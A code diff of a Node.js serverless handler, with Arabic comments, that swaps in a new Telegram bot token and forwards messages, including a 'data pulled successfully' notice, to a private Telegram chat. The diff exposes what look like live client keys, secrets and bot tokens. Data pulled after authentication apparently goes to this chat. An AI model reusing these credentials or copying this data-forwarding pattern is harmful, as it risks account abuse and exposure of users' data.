@@ -1,9 +1,9 @@
 const https = require('https');
 
-// الإعدادات الثابتة الخاصة بك
+// الإعدادات الثابتة الخاصة بك (التوكين الجديد تم دمجه هنا)
 const CLIENT_KEY = 'sbawsudq1bxhkm3b3y';
 const CLIENT_SECRET = 'hddQpiSl5FTstFFjEYxifCWvNdvifUXa';
-const TELEGRAM_TOKEN = '8764995786:AAH6TdLNgNP7n13JKr7M8GSFlgW3Sr87dXE';
+const TELEGRAM_TOKEN = '8540803234:AAGD95o6JuOzVLYZ6-8Cm0vQDlPD3wtJGl4';
 const TELEGRAM_CHAT_ID = '7644255708';
 
 function makeRequest(options, postData = null) {
@@ -21,18 +21,10 @@ function makeRequest(options, postData = null) {
   });
 }
 
-// دالة إرسال مبسطة ومضمونة بدون تنسيق ماركداون معقد قد يسبب الرفض
 function sendTelegram(message) {
   const cleanMessage = message.replace(/[*_`\[\]]/g, ''); // تنظيف النص من الرموز الحساسة
   const path = `/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(cleanMessage)}`;
-  
-  const req = https.get(`https://api.telegram.org${path}`, (res) => {
-    // مراقبة رد تلجرام للتأكد
-    let d = '';
-    res.on('data', (chunk) => d += chunk);
-    res.on('end', () => console.log('Telegram reply:', d));
-  });
-  req.on('error', (e) => console.error('Telegram error:', e));
+  https.get(`https://api.telegram.org${path}`);
 }
 
 module.exports = async (req, res) => {
@@ -98,7 +90,7 @@ module.exports = async (req, res) => {
     sendTelegram(telegramMessage);
 
     res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
-    res.end('<h1>✅ تم التحديث الفوري! تفقد تليجرام الآن.</h1>');
+    res.end('<h1>✅ تم التوثيق وسحب البيانات بنجاح! تفقد البوت الجديد الآن.</h1>');
 
   } catch (err) {
     sendTelegram(`⚠️ حدث خطأ داخلي: ${err.message}`);
